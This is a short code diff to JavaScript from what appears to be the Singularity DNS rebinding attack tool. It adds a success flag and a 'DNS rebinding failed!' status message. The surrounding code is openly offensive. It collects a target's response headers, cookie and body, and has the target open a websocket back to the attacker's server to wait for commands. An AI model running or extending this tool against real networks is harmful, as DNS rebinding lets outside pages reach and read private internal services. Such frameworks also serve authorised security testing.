@@ -11,6 +11,9 @@ const Rebinder = () => {
     let payload = null;
     let interval = 60000;
     let wsproxyport = 3129;
+    let rebindingSuccess = false;
+
+    const rebindingStatusEl = document.getElementById('rebindingstatus');
 
     function initCommsWithParentFrame() {
         window.addEventListener('message', function (e) {
@@ -37,6 +40,9 @@ const Rebinder = () => {
                     break;
                 case 'stop':
                     clearInterval(timer);
+                    if (rebindingSuccess === false) {
+                        rebindingStatusEl.innerText = `DNS rebinding failed!`;
+                    }
                     break;
                 case 'start':
                     timer = setInterval(function () { run() }, interval);
@@ -96,7 +102,7 @@ const Rebinder = () => {
                     response: body
                 }, "*");
                 // Terminate the attack
-                const rebindingStatusEl = document.getElementById('rebindingstatus');
+                rebindingSuccess = true;
                 rebindingStatusEl.innerText = `DNS rebinding successful!`;
                 rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
             })
@@ -150,9 +156,7 @@ function begin(url) {
     r.init(url, attack);
 }
 
-
-function wait(n) { return new Promise(resolve => setTimeout(resolve, n)); }
-
+function wait(n) {return new Promise(resolve => setTimeout(resolve, n));}
 
 // Request target to establish a websocket to Singularity server and wait for commands
 // Implements retries to handle multiple answer strategy and firewall blocks.
